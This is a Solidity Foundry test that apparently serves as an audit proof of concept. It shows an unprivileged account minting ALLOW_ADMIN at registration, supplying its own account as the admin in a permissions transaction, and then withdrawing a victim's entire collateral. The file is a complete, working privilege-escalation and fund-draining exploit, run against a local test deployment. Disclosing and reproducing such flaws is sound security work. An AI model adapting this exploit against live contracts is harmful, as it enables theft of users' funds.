// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// HOW TO RUN: place this file in the repo's test/ directory, then:
//   forge test --match-contract AC1AdminEscalation -vv
//
// RESULT: an unprivileged user mints ALLOW_ADMIN on their OWN freshly-registered
// account (the registration path stores the initial non-owner-signer mask VERBATIM,
// with no delegation check), then sends an AdminSetSignerPermissions tx carrying
// adminAccountId = their own account. processAdminSetSignerPermissions never checks
// that adminAccountId is the genuine designated SignerManager.adminAccountId(); it
// only checks the recovered signer holds ALLOW_ADMIN on the *supplied* account.
// The attacker thereby grants their own key ALLOW_WITHDRAW on a VICTIM account and
// drains the victim's deposited collateral.

import "forge-std/Test.sol";
import "../script/Deploy.s.sol";
import "./mocks/MockERC20Permit.sol";

import "../src/core/account/transactions/RegisterAccountTransLib.sol";
import "../src/core/signer/transactions/PermissionsTransLib.sol";
import "../src/core/signer/SignerPermissions.sol";
import "../src/core/balance/transactions/DepositTransLib.sol";
import "../src/core/balance/transactions/WithdrawalTransLib.sol";

/// @title AC1 — non-admin self-mints ALLOW_ADMIN and escalates to drain any account
contract AC1AdminEscalation is Test, DeployScript {
    // deployer / admin key
    uint256 internal constant PK_DEPLOY = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
    // victim owner key
    uint256 internal constant PK_VICTIM = 0x2a871d0798f97d79848a013d4936a73bf4cc922c825d33c1cf7073dff6d409c6;
    // attacker owner key
    uint256 internal constant PK_ATK = 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a;
    // attacker session key (gets ALLOW_ADMIN at registration)
    uint256 internal constant PK_ATK_SESSION = 0x7c852118294e51e653712a81e05800f419141751be58f605c371e15141b007a6;

    uint64 internal constant UID_VICTIM = 2;
    uint64 internal constant UID_ATK = 3;
    uint64 internal constant COLLATERAL_ASSET_ID = 1;

    Addresses internal addrs;
    address internal deployer;
    address internal victim;
    address internal attacker;
    address internal attackerSession;
    MockERC20Permit internal token;

    function setUp() public {
        deployer = vm.addr(PK_DEPLOY);
        victim = vm.addr(PK_VICTIM);
        attacker = vm.addr(PK_ATK);
        attackerSession = vm.addr(PK_ATK_SESSION);

        vm.startPrank(deployer);
        addrs = _deployContracts(Profile.Spot, deployer);
        _wireContracts(addrs, Profile.Spot, deployer);
        token = MockERC20Permit(addrs.depositToken);

        GeneralConfig gc = GeneralConfig(addrs.generalConfig);
        gc.setAssetAdmin(deployer);
        gc.setCollateralAssetInfo(CollateralAssetInfo({assetId: COLLATERAL_ASSET_ID, resolution: 1}));
        vm.stopPrank();
    }

    function testNonAdminMintsAdminAndDrainsVictim() public {
        // ---- The genuine designated admin account is uid 1 (deployer). ----
        SignerManager sm = SignerManager(addrs.signerManager);
        // SETUP ONLY (not the exploit): establish the legitimate baseline — designate
        // account uid 1 (deployer == adminAddress) as the genuine SignerManager admin.
        // The exploit below uses only signed txs through the real dispatch.
        vm.prank(deployer);
        sm.addSignerWithPermissions(1, deployer, 0); // triggers admin auto-designation
        assertEq(sm.adminAccountId(), 1, "genuine admin account is uid 1");
        // Sanity: a normal account owner does NOT hold ALLOW_ADMIN.
        // (We confirm the attacker cannot legitimately get it through the admin.)

        // ---- VICTIM registers normally and deposits 1000 tokens. ----
        _register(UID_VICTIM, victim, PK_VICTIM, _noSigners());
        _fund(victim, 1000);
        _processDeposit(UID_VICTIM, 1000);
        assertEq(
            AccountManager(addrs.accountManager).getCollateralPositionBalance(UID_VICTIM, 0),
            1000,
            "victim funded"
        );

        // ---- ATTACKER registers an account, sneaking ALLOW_ADMIN onto a session key. ----
        // The registration path stores the non-owner-signer mask VERBATIM with NO
        // delegation check (SignerManager.addSignerWithPermissions, non-owner branch).
        SignerInit[] memory atkSigners = new SignerInit[](1);
        atkSigners[0] = SignerInit({signer: attackerSession, permissions: SignerPermissions.ALLOW_ADMIN});
        _register(UID_ATK, attacker, PK_ATK, atkSigners);

        // The attacker's session key now holds ALLOW_ADMIN — on a NON-admin account.
        assertEq(
            sm.getSignerPermissions(UID_ATK, attackerSession) & SignerPermissions.ALLOW_ADMIN,
            SignerPermissions.ALLOW_ADMIN,
            "attacker self-minted ALLOW_ADMIN on its own account (uid 3 != adminAccountId 1)"
        );
        assertTrue(UID_ATK != sm.adminAccountId(), "attacker account is NOT the designated admin");

        // ---- ATTACKER uses AdminSetSignerPermissions with adminAccountId = its OWN uid. ----
        // processAdminSetSignerPermissions only checks the signer holds ALLOW_ADMIN on
        // the *supplied* adminAccountId — never that it equals the real adminAccountId.
        // Grant the attacker's session key ALLOW_WITHDRAW on the VICTIM account.
        AdminSetSignerPermissionsTx memory atx = AdminSetSignerPermissionsTx({
            adminAccountId: UID_ATK,            // attacker-supplied "admin" account
            targetAccountId: UID_VICTIM,        // victim
            signer: attackerSession,            // grant to attacker's key
            mask: SignerPermissions.ALLOW_WITHDRAW,
            nonce: 1,
            signature: ""
        });
        bytes32 mh = PermissionsTransLib.getAdminSetSignerPermissionsHash(atx, block.chainid, addrs.transactionProcessor);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PK_ATK_SESSION, mh);
        atx.signature = abi.encodePacked(r, s, v);

        vm.prank(addrs.multiTransactionProcessor);
        TransactionProcessor(addrs.transactionProcessor).processTransaction(
            TYPE_ADMIN_SET_SIGNER_PERMISSIONS, abi.encode(atx)
        );

        // Attacker now controls withdrawals on the victim account.
        assertEq(
            sm.getSignerPermissions(UID_VICTIM, attackerSession) & SignerPermissions.ALLOW_WITHDRAW,
            SignerPermissions.ALLOW_WITHDRAW,
            "ESCALATED: attacker key now has ALLOW_WITHDRAW on the victim account"
        );

        // ---- ATTACKER drains the victim's 1000 tokens to its own EOA. ----
        address atkEOA = makeAddr("atkEOA");
        Withdrawal memory w =
            Withdrawal({from: UID_VICTIM, toAddress: atkEOA, amount: 1000, nonce: 2, signature: ""});
        bytes32 wh = WithdrawalTransLib.getWithdrawalHash(w, block.chainid, addrs.transactionProcessor);
        (v, r, s) = vm.sign(PK_ATK_SESSION, wh);
        w.signature = abi.encodePacked(r, s, v);

        vm.prank(addrs.multiTransactionProcessor);
        TransactionProcessor(addrs.transactionProcessor).processTransaction(TYPE_WITHDRAWAL, abi.encode(w));

        assertEq(token.balanceOf(atkEOA), 1000, "attacker stole the victim's entire deposit");
        assertEq(
            AccountManager(addrs.accountManager).getCollateralPositionBalance(UID_VICTIM, 0),
            0,
            "victim account drained to 0"
        );
    }

    // ───────────────────────── helpers ─────────────────────────

    function _noSigners() internal pure returns (SignerInit[] memory) {
        return new SignerInit[](0);
    }

    function _register(uint64 accountId, address owner, uint256 pk, SignerInit[] memory signers) internal {
        RegisterAccount memory ra =
            RegisterAccount({accountId: accountId, owner: owner, signers: signers, signature: ""});
        bytes32 mh = RegisterAccountTransLib.getRegisterAccountHash(ra, block.chainid, addrs.transactionProcessor);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, mh);
        ra.signature = abi.encodePacked(r, s, v);
        vm.prank(addrs.multiTransactionProcessor);
        TransactionProcessor(addrs.transactionProcessor).processTransaction(TYPE_REGISTER_ACCOUNT, abi.encode(ra));
    }

    function _fund(address user, uint256 amount) internal {
        vm.prank(deployer);
        token.transfer(user, amount);
        vm.startPrank(user);
        token.approve(addrs.loadingZone, amount);
        LoadingZone(addrs.loadingZone).deposit(amount);
        vm.stopPrank();
    }

    function _processDeposit(uint64 accountId, int256 amount) internal {
        Deposit memory d = Deposit({accountId: accountId, amount: amount});
        vm.prank(addrs.multiTransactionProcessor);
        TransactionProcessor(addrs.transactionProcessor).processTransaction(TYPE_DEPOSIT, abi.encode(d));
    }
}
